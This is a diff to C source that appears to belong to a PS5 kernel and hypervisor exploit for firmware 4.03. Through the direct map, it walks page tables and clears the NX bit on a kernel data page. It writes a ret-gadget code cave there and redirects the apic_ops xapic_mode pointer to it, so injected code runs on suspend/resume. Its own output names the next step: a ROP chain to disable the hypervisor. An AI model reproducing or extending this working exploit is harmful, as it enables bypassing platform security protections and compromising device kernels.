@@ -4998,158 +4998,272 @@ static void campaign_flatz_setup(void) {
         }
 
         /*
-         * Check if we're in post-resume state by looking at QA flags.
-         * If bytes 4-7 have our marker (0xABCDEF42), we already did
-         * a suspend/resume cycle with this payload.
+         * Check if we're in post-resume state by looking at the
+         * kdata code cave.  If bytes 9-12 have PHASE7_MARKER,
+         * we already did a suspend/resume with the ret-gadget hook.
          */
-        uint8_t qa_post[16] = {0};
-        kernel_get_qaflags(qa_post);
-        uint32_t qa_marker = 0;
-        memcpy(&qa_marker, &qa_post[4], 4);
+        #define PHASE7_MARKER 0x42EFCDABUL
 
-        #define PHASE7_MARKER 0x42EFCDABUL  /* stored little-endian */
+        uint64_t cave_pa = va_to_pa_quiet(g_kdata_base);
+        if (cave_pa == 0) {
+            printf("[-] kdata_base VA→PA failed\n");
+            fflush(stdout);
+            return;
+        }
 
-        if (qa_marker == PHASE7_MARKER) {
+        uint8_t cave_probe[16] = {0};
+        kernel_copyout(g_dmap_base + cave_pa, cave_probe, 16);
+        uint32_t cave_marker = 0;
+        memcpy(&cave_marker, &cave_probe[9], 4);
+
+        if (cave_marker == PHASE7_MARKER) {
             /* ─── Post-resume: check results ─── */
-            printf("\n[+] *** POST-RESUME DETECTED (QA marker found) ***\n\n");
+            printf("\n[+] *** POST-RESUME DETECTED (kdata marker found) ***\n\n");
 
-            printf("[*] Checking QA flags persistence:\n");
-            printf("    QA bytes 0-1: %02x %02x",
-                   qa_post[0], qa_post[1]);
-            if (qa_post[0] == 0xFF && qa_post[1] == 0xFF)
-                printf(" — PERSISTED through resume!\n");
-            else
-                printf(" — REINITIALIZED by secure loader.\n");
-
-            printf("    QA marker:    0x%08x", qa_marker);
-            printf(" — PERSISTED (that's how we detected post-resume)\n");
+            /* Recover original xapic_mode address stored at cave+1 */
+            uint64_t orig_xapic = 0;
+            memcpy(&orig_xapic, &cave_probe[1], 8);
 
             /* Check apic_ops[2] */
             uint64_t xapic_now = 0;
             kernel_copyout(g_dmap_base + ops_pa + 0x10, &xapic_now, 8);
-            uint64_t expected_hook = ops[3];  /* is_x2apic address */
 
-            printf("\n[*] Checking apic_ops[2] (xapic_mode):\n");
-            printf("    Current:  0x%016lx\n", (unsigned long)xapic_now);
-            printf("    Original: 0x%016lx (xapic_mode)\n",
-                   (unsigned long)ops[2]);
-            printf("    Hooked:   0x%016lx (is_x2apic/slot3)\n",
-                   (unsigned long)expected_hook);
+            printf("[*] Checking apic_ops[2] (xapic_mode):\n");
+            printf("    Current value:  0x%016lx\n", (unsigned long)xapic_now);
+            printf("    Expected hook:  0x%016lx (kdata_base)\n",
+                   (unsigned long)g_kdata_base);
+            printf("    Original saved: 0x%016lx\n", (unsigned long)orig_xapic);
 
-            if (xapic_now == expected_hook) {
+            if (xapic_now == g_kdata_base) {
                 printf("\n[+] ============================================\n");
-                printf("[+]  APIC_OPS HOOK PERSISTED THROUGH RESUME!\n");
+                printf("[+]  APIC_OPS RET-HOOK SURVIVED RESUME!\n");
                 printf("[+] ============================================\n");
-                printf("[+] apic_ops[2] still has our hooked value.\n");
-                printf("[+] If the system resumed normally, the hook FIRED\n");
-                printf("[+] during cpususpend_handler → lapic_xapic_mode().\n");
+                printf("[+] apic_ops[2] = kdata_base (our ret gadget).\n");
+                printf("[+] System resumed successfully → hook FIRED!\n");
+                printf("[+] cpususpend_handler called xapic_mode → 0xC3 → ret → OK\n");
                 printf("[+]\n");
-                printf("[+] This means:\n");
+                printf("[+] CONFIRMED on FW 4.03:\n");
                 printf("[+]   1. Kernel .data survives suspend/resume\n");
-                printf("[+]   2. apic_ops[2] is not reinitialized\n");
-                printf("[+]   3. The APIC hook method works on FW 4.03!\n");
-                printf("[+]   4. With a proper ROP gadget, full HV bypass is possible\n");
-            } else if (xapic_now == ops[2]) {
-                printf("\n[-] apic_ops[2] was restored to original value.\n");
+                printf("[+]   2. Guest PTE modifications survive suspend/resume\n");
+                printf("[+]   3. apic_ops[2] is NOT reinitialized on resume\n");
+                printf("[+]   4. Code at kdata_base executes during resume\n");
+                printf("[+]   5. apic_ops hook method WORKS for HV bypass!\n");
+                printf("[+]\n");
+                printf("[+] Next: replace ret with real payload (ROP chain / HV disable)\n");
+            } else if (orig_xapic && xapic_now == orig_xapic) {
+                printf("\n[-] apic_ops[2] was restored to original xapic_mode.\n");
                 printf("    Kernel reinitializes apic_ops during resume.\n");
-                printf("    The apic_ops hook method may not work on FW 4.03.\n");
             } else {
-                printf("\n[?] apic_ops[2] has unexpected value.\n");
-                printf("    Possible: KASLR changed, or kernel modified it.\n");
+                printf("\n[?] apic_ops[2] has unexpected value: 0x%016lx\n",
+                       (unsigned long)xapic_now);
+                printf("    Possible: KASLR changed (cold reboot?) or kernel modified it.\n");
             }
 
-            /* Restore apic_ops[2] to original */
-            printf("\n[*] Restoring apic_ops[2] to original value...\n");
-            kernel_copyin(&ops[2], g_dmap_base + ops_pa + 0x10, 8);
-            uint64_t verify_restore = 0;
-            kernel_copyout(g_dmap_base + ops_pa + 0x10, &verify_restore, 8);
-            printf("    Restored: 0x%016lx %s\n",
-                   (unsigned long)verify_restore,
-                   verify_restore == ops[2] ? "[OK]" : "[MISMATCH]");
+            /* Check QA flags persistence too */
+            uint8_t qa_post[16] = {0};
+            kernel_get_qaflags(qa_post);
+            printf("\n[*] QA flags after resume:\n");
+            printf("    Bytes 0-1: %02x %02x", qa_post[0], qa_post[1]);
+            if (qa_post[0] == 0xFF && qa_post[1] == 0xFF)
+                printf(" — PERSISTED!\n");
+            else
+                printf(" — reinitialized by secure loader.\n");
 
-            /* Clear marker */
-            uint8_t qa_clear[16];
-            kernel_get_qaflags(qa_clear);
-            memset(&qa_clear[4], 0, 4);
-            kernel_set_qaflags(qa_clear);
+            /* Restore apic_ops[2] to original */
+            if (orig_xapic && xapic_now != orig_xapic) {
+                printf("\n[*] Restoring apic_ops[2] → 0x%016lx\n",
+                       (unsigned long)orig_xapic);
+                kernel_copyin(&orig_xapic, g_dmap_base + ops_pa + 0x10, 8);
+                uint64_t verify_r = 0;
+                kernel_copyout(g_dmap_base + ops_pa + 0x10, &verify_r, 8);
+                printf("    Restored: 0x%016lx %s\n",
+                       (unsigned long)verify_r,
+                       verify_r == orig_xapic ? "[OK]" : "[MISMATCH]");
+            }
+
+            /* Clear code cave marker (write zeros over our data) */
+            uint8_t zeros[16] = {0};
+            kernel_copyin(zeros, g_dmap_base + cave_pa, 16);
+            printf("[*] Code cave marker cleared.\n");
+
+            notify("[HV Research] Phase 7: Post-resume check complete!");
 
         } else {
-            /* ─── Pre-suspend: set up hook ─── */
-            printf("\n[*] Phase 7: Setting up apic_ops hook for suspend/resume test\n");
+            /* ─── Pre-suspend: set up ret-gadget hook ─── */
+            printf("\n[*] Phase 7: Setting up ret-gadget hook for suspend/resume\n\n");
 
             /*
-             * Strategy: Write apic_ops[3] address to apic_ops[2].
+             * Strategy: Write a bare 'ret' (0xC3) to kdata_base and
+             * point apic_ops[2] to it.  On resume:
              *
-             * In FreeBSD, apic_ops[3] is is_x2apic: int(*)(void).
-             * On PS5, the exact function is unknown but it's a ktext ptr.
-             * Calling a different apic_ops function instead of xapic_mode:
-             *   - It will execute and return (valid function)
-             *   - xapic mode won't be properly initialized
-             *   - System SHOULD still resume (LAPIC defaults to xapic mode)
-             *   - If system crashes during resume → hook DID fire
+             *   cpususpend_handler → lapic_xapic_mode() →
+             *     (*apic_ops.xapic_mode)() → kdata_base →
+             *     0xC3 (ret) → returns to lapic_xapic_mode →
+             *     returns to cpususpend_handler → resume continues
              *
-             * Also write a marker to QA flags bytes 4-7 so we can
-             * detect post-resume state on the next run.
+             * xapic_mode becomes a no-op.  On AMD/PS5 the LAPIC is
+             * already in xAPIC mode, so skipping it is harmless.
+             *
+             * Code cave layout at kdata_base:
+             *   +0:  0xC3           (ret gadget)
+             *   +1:  8 bytes        (original xapic_mode addr for restore)
+             *   +9:  4 bytes        (PHASE7_MARKER for detection)
+             *   +13: 3 bytes        (padding)
+             *
+             * All writes via DMAP — no ring-0 execution needed.
              */
+
             uint64_t original_xapic = ops[2];
-            uint64_t replacement = ops[3];  /* slot 3 = likely is_x2apic */
-
-            printf("    apic_ops[2] original (xapic_mode): 0x%016lx\n",
+            printf("    apic_ops[2] original: 0x%016lx\n",
                    (unsigned long)original_xapic);
-            printf("    Replacement (slot[3]):              0x%016lx\n",
-                   (unsigned long)replacement);
+            printf("    Replacement target:   0x%016lx (kdata_base = ret gadget)\n",
+                   (unsigned long)g_kdata_base);
 
-            /* Write the hook */
-            uint64_t slot2_dmap = g_dmap_base + ops_pa + 0x10;
-            kernel_copyin(&replacement, slot2_dmap, 8);
+            /* Step 1: Walk page table for kdata_base, clear NX */
+            printf("\n[*] Step 1: Clear NX bit on kdata_base page...\n");
 
-            /* Verify */
-            uint64_t verify_hook = 0;
-            kernel_copyout(slot2_dmap, &verify_hook, 8);
-            if (verify_hook == replacement) {
-                printf("[+] Hook written: apic_ops[2] = 0x%016lx\n",
-                       (unsigned long)verify_hook);
-            } else {
-                printf("[-] Hook write failed: got 0x%016lx\n",
-                       (unsigned long)verify_hook);
+            uint64_t walk_e;
+            uint64_t walk_pa;
+            uint64_t p7_pte_pa = 0;
+            uint64_t p7_orig_pte = 0;
+            int p7_is_2mb = 0;
+
+            /* PML4 */
+            walk_pa = g_cr3_phys + ((g_kdata_base >> 39) & 0x1FF) * 8;
+            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+            if (!(walk_e & PTE_PRESENT)) {
+                printf("[-] PML4E not present\n");
                 fflush(stdout);
                 return;
             }
 
-            /* Write QA marker */
-            uint8_t qa_marker_buf[16];
-            kernel_get_qaflags(qa_marker_buf);
-            uint32_t marker_val = PHASE7_MARKER;
-            memcpy(&qa_marker_buf[4], &marker_val, 4);
-            kernel_set_qaflags(qa_marker_buf);
+            /* PDP */
+            walk_pa = (walk_e & PTE_PA_MASK) + ((g_kdata_base >> 30) & 0x1FF) * 8;
+            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+            if (!(walk_e & PTE_PRESENT)) {
+                printf("[-] PDPE not present\n");
+                fflush(stdout);
+                return;
+            }
 
-            /* Verify marker */
-            uint8_t qa_verify_buf[16] = {0};
-            kernel_get_qaflags(qa_verify_buf);
-            uint32_t marker_check = 0;
-            memcpy(&marker_check, &qa_verify_buf[4], 4);
-            printf("[+] QA marker set: 0x%08x %s\n",
-                   marker_check,
-                   marker_check == PHASE7_MARKER ? "[OK]" : "[FAIL]");
+            /* PD */
+            walk_pa = (walk_e & PTE_PA_MASK) + ((g_kdata_base >> 21) & 0x1FF) * 8;
+            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+            if (!(walk_e & PTE_PRESENT)) {
+                printf("[-] PDE not present\n");
+                fflush(stdout);
+                return;
+            }
+            if (walk_e & PTE_PS) {
+                /* 2MB page */
+                p7_is_2mb = 1;
+                p7_pte_pa = walk_pa;
+                p7_orig_pte = walk_e;
+            } else {
+                /* PT level */
+                walk_pa = (walk_e & PTE_PA_MASK) + ((g_kdata_base >> 12) & 0x1FF) * 8;
+                kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+                if (!(walk_e & PTE_PRESENT)) {
+                    printf("[-] PTE not present\n");
+                    fflush(stdout);
+                    return;
+                }
+                p7_pte_pa = walk_pa;
+                p7_orig_pte = walk_e;
+            }
+
+            printf("    PTE at PA 0x%lx: 0x%016lx (%s page)\n",
+                   (unsigned long)p7_pte_pa, (unsigned long)p7_orig_pte,
+                   p7_is_2mb ? "2MB" : "4KB");
+            printf("    NX=%d RW=%d\n",
+                   (int)(p7_orig_pte >> 63), (int)((p7_orig_pte >> 1) & 1));
+
+            uint64_t p7_new_pte = p7_orig_pte;
+            p7_new_pte &= ~PTE_BIT_NX;   /* clear NX → executable */
+            p7_new_pte &= ~(1ULL << 8);  /* clear G → TLB friendly */
+            kernel_copyin(&p7_new_pte, g_dmap_base + p7_pte_pa, 8);
+
+            uint64_t pte_verify = 0;
+            kernel_copyout(g_dmap_base + p7_pte_pa, &pte_verify, 8);
+            printf("    New PTE: 0x%016lx NX=%d [%s]\n",
+                   (unsigned long)pte_verify,
+                   (int)(pte_verify >> 63),
+                   (pte_verify == p7_new_pte) ? "OK" : "MISMATCH");
+
+            /* Step 2: Write code cave payload to kdata_base */
+            printf("\n[*] Step 2: Writing ret-gadget to kdata_base via DMAP...\n");
+
+            uint8_t cave_payload[16];
+            memset(cave_payload, 0, sizeof(cave_payload));
+            cave_payload[0] = 0xC3;    /* ret */
+            memcpy(&cave_payload[1], &original_xapic, 8);   /* saved addr */
+            uint32_t marker_val = PHASE7_MARKER;
+            memcpy(&cave_payload[9], &marker_val, 4);        /* marker */
+
+            /* Save original kdata bytes for debug */
+            uint8_t cave_orig[16];
+            kernel_copyout(g_dmap_base + cave_pa, cave_orig, 16);
+            printf("    Original kdata bytes: ");
+            for (int i = 0; i < 16; i++) printf("%02x ", cave_orig[i]);
+            printf("\n");
+
+            kernel_copyin(cave_payload, g_dmap_base + cave_pa, 16);
+
+            uint8_t cave_verify[16];
+            kernel_copyout(g_dmap_base + cave_pa, cave_verify, 16);
+            int cave_ok = (memcmp(cave_payload, cave_verify, 16) == 0);
+            printf("    Written:              ");
+            for (int i = 0; i < 16; i++) printf("%02x ", cave_verify[i]);
+            printf("[%s]\n", cave_ok ? "OK" : "MISMATCH");
+
+            if (!cave_ok) {
+                printf("[-] Code cave write failed — aborting.\n");
+                /* Restore PTE */
+                kernel_copyin(&p7_orig_pte, g_dmap_base + p7_pte_pa, 8);
+                fflush(stdout);
+                return;
+            }
+
+            /* Step 3: Write kdata_base to apic_ops[2] */
+            printf("\n[*] Step 3: Hooking apic_ops[2] → kdata_base...\n");
+
+            uint64_t slot2_dmap = g_dmap_base + ops_pa + 0x10;
+            uint64_t kdata_val = g_kdata_base;
+            kernel_copyin(&kdata_val, slot2_dmap, 8);
+
+            uint64_t hook_verify = 0;
+            kernel_copyout(slot2_dmap, &hook_verify, 8);
+            printf("    apic_ops[2] = 0x%016lx [%s]\n",
+                   (unsigned long)hook_verify,
+                   (hook_verify == g_kdata_base) ? "OK" : "MISMATCH");
+
+            /* Also set QA flags 0xFF for parallel persistence test */
+            uint8_t qa_set[16];
+            kernel_get_qaflags(qa_set);
+            qa_set[0] = 0xFF;
+            qa_set[1] = 0xFF;
+            kernel_set_qaflags(qa_set);
 
             printf("\n[+] ============================================\n");
-            printf("[+]  HOOK ARMED — READY FOR SUSPEND/RESUME TEST\n");
+            printf("[+]  RET-GADGET HOOK ARMED!\n");
             printf("[+] ============================================\n");
             printf("[+]\n");
-            printf("[+] apic_ops[2] now points to slot[3] instead of xapic_mode.\n");
-            printf("[+] QA marker set for post-resume detection.\n");
+            printf("[+] Summary of persistent modifications:\n");
+            printf("[+]   kdata_base:  0xC3 (ret) + metadata\n");
+            printf("[+]   kdata PTE:   NX cleared (executable)\n");
+            printf("[+]   apic_ops[2]: 0x%016lx (kdata_base)\n",
+                   (unsigned long)g_kdata_base);
+            printf("[+]   QA bytes 0-1: 0xFF 0xFF\n");
             printf("[+]\n");
-            printf("[+] TO TEST: Put PS5 in REST MODE, then wake + re-run.\n");
+            printf("[+] On resume, cpususpend_handler will call:\n");
+            printf("[+]   lapic_xapic_mode() → apic_ops[2] → 0xC3 (ret) → no-op\n");
+            printf("[+]   System should resume normally!\n");
             printf("[+]\n");
-            printf("[+] Expected outcomes:\n");
-            printf("[+]   A. System resumes normally → hook fired, slot[3] compatible\n");
-            printf("[+]   B. System crashes on resume → hook fired, slot[3] incompatible\n");
-            printf("[+]      (just reboot — no permanent damage)\n");
-            printf("[+]   C. apic_ops[2] restored to original → kernel reinitializes\n");
-            printf("[+]\n");
-            printf("[+] Outcome A or B = apic_ops hook METHOD WORKS on FW 4.03!\n");
+            printf("[+] TO TEST: Put PS5 in REST MODE, wake, re-run exploit.\n");
+            printf("[+]   If system resumes → Phase 7 post-resume will report.\n");
+            printf("[+]   This time it should NOT crash (ret is safe).\n");
 
-            notify("[HV Research] Phase 7: Hook ARMED. Enter REST MODE to test!");
+            notify("[HV Research] Phase 7: RET-GADGET hook armed. Enter REST MODE!");
         }
 
         printf("\n");
